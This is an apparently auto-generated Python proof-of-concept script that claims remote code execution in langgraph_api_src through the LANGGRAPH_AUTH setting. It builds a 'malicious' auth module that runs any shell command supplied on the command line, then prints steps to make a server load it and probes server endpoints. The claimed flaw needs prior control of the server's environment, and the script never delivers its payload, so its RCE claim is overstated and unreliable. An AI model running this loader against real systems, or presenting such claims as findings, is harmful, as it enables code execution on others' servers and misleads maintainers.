#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-004
# Sink: profiled_import
# Auto-generated — run with: python3 rce_load_auth_obj_function_profiled_import_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for RCE in langgraph_api_src

Vulnerability: The _load_auth_obj function in custom.py loads a Python module
from a user-controlled path (LANGGRAPH_AUTH['path']). This path is provided
via environment variable or configuration. The function uses
importlib.util.spec_from_file_location and exec_module to load arbitrary
Python files, leading to RCE. No sanitization or validation is performed
on the path beyond checking for a colon separator.

Attack vector: An attacker with access to the server's environment can set
the LANGGRAPH_AUTH environment variable to point to a malicious Python file.
The file will be executed when the server starts or when authentication is
initialized.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign payload
2. Setting the LANGGRAPH_AUTH environment variable to point to this file
3. Triggering the vulnerable code path
"""

import os
import sys
import tempfile
import subprocess
import json
import time
import urllib.request
import urllib.error
import argparse
from pathlib import Path


def create_malicious_payload(payload_dir: str, payload_command: str) -> str:
    """
    Create a malicious Python file that will be loaded by the vulnerable function.
    
    Args:
        payload_dir: Directory to create the payload file in
        payload_command: Command to execute (benign by default)
    
    Returns:
        Path to the created payload file
    """
    # The payload must define a class that inherits from Auth to pass the type check
    # But the code executes BEFORE the type check, so we can run arbitrary code
    payload_code = f'''
import os
import subprocess

# This code runs BEFORE the type check in _load_auth_obj
# The exec_module call executes the entire module, so this runs immediately
print("[*] Malicious module loaded - executing payload...")
result = subprocess.run(
    "{payload_command}",
    shell=True,
    capture_output=True,
    text=True,
    timeout=10
)
print(f"[*] Payload output: {{result.stdout}}")
print(f"[*] Payload stderr: {{result.stderr}}")
print(f"[*] Payload return code: {{result.returncode}}")

# Define the required Auth class to pass the type check
# This is needed to avoid raising an exception after execution
class Auth:
    """Minimal Auth class to pass the isinstance check."""
    def __init__(self):
        self._authenticate_handler = None
    
    def authenticate(self, request):
        return None

# Create an instance that will be returned
auth_instance = Auth()
'''
    
    payload_path = os.path.join(payload_dir, "malicious_auth.py")
    with open(payload_path, 'w') as f:
        f.write(payload_code)
    
    print(f"[*] Created malicious payload at: {payload_path}")
    return payload_path


def trigger_vulnerability(target_url: str, payload_path: str, timeout: int = 10):
    """
    Trigger the vulnerability by making a request that causes the server
    to load the malicious auth module.
    
    The vulnerability is triggered when the server initializes authentication.
    We can trigger this by:
    1. Making a request that requires authentication
    2. Or by accessing an endpoint that triggers auth initialization
    
    Args:
        target_url: Base URL of the target server
        payload_path: Path to the malicious Python file
        timeout: Request timeout in seconds
    """
    # The LANGGRAPH_AUTH environment variable must be set to our payload
    # Format: "./path/to/file.py:ClassName"
    auth_path = f"{payload_path}:auth_instance"
    
    # We need to set this environment variable before the server starts
    # or trigger a reload. For this PoC, we'll demonstrate the concept
    # by showing how the environment variable should be set.
    
    print(f"[*] To exploit, set the following environment variable:")
    print(f"    LANGGRAPH_AUTH={{\"path\": \"{auth_path}\"}}")
    print()
    print("[*] Then restart the server or trigger auth initialization")
    print()
    
    # Attempt to trigger auth initialization by making requests
    endpoints_to_try = [
        f"{target_url}/ok",
        f"{target_url}/health",
        f"{target_url}/docs",
        f"{target_url}/openapi.json",
    ]
    
    for endpoint in endpoints_to_try:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            req = urllib.request.Request(endpoint)
            with urllib.request.urlopen(req, timeout=timeout) as response:
                print(f"    Status: {response.status}")
                print(f"    Response: {response.read().decode()[:200]}")
        except urllib.error.HTTPError as e:
            print(f"    HTTP Error: {e.code} - {e.reason}")
        except urllib.error.URLError as e:
            print(f"    URL Error: {e.reason}")
        except Exception as e:
            print(f"    Error: {e}")
    
    print()
    print("[*] If the server is configured to load auth on startup,")
    print("    the payload should have executed when the server started.")
    print("    Check for the payload output in the server logs.")


def demonstrate_exploit_mechanism():
    """
    Demonstrate the exploit mechanism by showing how the vulnerable code
    works and how an attacker could exploit it.
    """
    print("=" * 60)
    print("VULNERABILITY EXPLOITATION DEMONSTRATION")
    print("=" * 60)
    print()
    
    # Create a temporary directory for our payload
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a benign payload that just creates a file
        payload_command = "echo 'POC_SUCCESS' > /tmp/poc_success.txt"
        payload_path = create_malicious_payload(tmpdir, payload_command)
        
        print()
        print("[*] The vulnerable code path:")
        print("    1. LANGGRAPH_AUTH environment variable is read")
        print("    2. The 'path' field is extracted")
        print("    3. _load_auth_obj() is called with this path")
        print("    4. importlib.util.spec_from_file_location() loads the file")
        print("    5. exec_module() executes the entire module")
        print("    6. Only AFTER execution, the type check occurs")
        print()
        print("[*] This means arbitrary code runs before validation!")
        print()
        
        # Show the vulnerable code
        print("[*] Vulnerable code in _load_auth_obj (custom.py:743):")
        print("""
    if "/" in module_name or ".py" in module_name:
        # Load from file path
        modname = f"dynamic_module_{hash(module_name)}"
        modspec = importlib.util.spec_from_file_location(modname, module_name)
        if modspec is None or modspec.loader is None:
            raise ValueError(f"Could not load file: {module_name}")
        module = importlib.util.module_from_spec(modspec)
        sys.modules[modname] = module
        modspec.loader.exec_module(module)  # <-- CODE EXECUTED HERE
    ...
    # Type check happens AFTER execution
    if not isinstance(loaded_auth, Auth):
        raise ValueError(f"Expected an Auth instance, got {type(loaded_auth)}")
        """)
        
        print()
        print("[*] To exploit this vulnerability:")
        print("    1. Create a malicious Python file with arbitrary code")
        print("    2. Set LANGGRAPH_AUTH to point to this file")
        print("    3. The code executes when the server loads auth")
        print()
        
        # Show the payload we created
        print(f"[*] Created payload at: {payload_path}")
        print("[*] Payload contents:")
        with open(payload_path, 'r') as f:
            print(f.read())
        
        print()
        print("[*] The payload will execute the command:")
        print(f"    {payload_command}")
        print()
        print("[*] After execution, check /tmp/poc_success.txt")
        print()


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langgraph_api_src via LANGGRAPH_AUTH"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8123",
        help="Target server URL (default: http://localhost:8123)"
    )
    parser.add_argument(
        "--demonstrate",
        action="store_true",
        help="Demonstrate the exploit mechanism without attacking a server"
    )
    parser.add_argument(
        "--payload-command",
        default="echo 'POC_SUCCESS' > /tmp/poc_success.txt",
        help="Command to execute as payload (default: create /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    if args.demonstrate:
        demonstrate_exploit_mechanism()
        return
    
    print("[*] LangGraph API Auth RCE PoC")
    print(f"[*] Target: {args.target}")
    print()
    
    # Create temporary payload
    with tempfile.TemporaryDirectory() as tmpdir:
        payload_path = create_malicious_payload(tmpdir, args.payload_command)
        
        print()
        print("[*] Attempting to trigger vulnerability...")
        print("[*] Note: This requires the server to be configured")
        print("[*] to load auth from environment variable.")
        print()
        
        trigger_vulnerability(args.target, payload_path)
    
    print()
    print("[*] PoC completed.")
    print("[*] Check the server logs for payload execution output.")


if __name__ == "__main__":
    main()
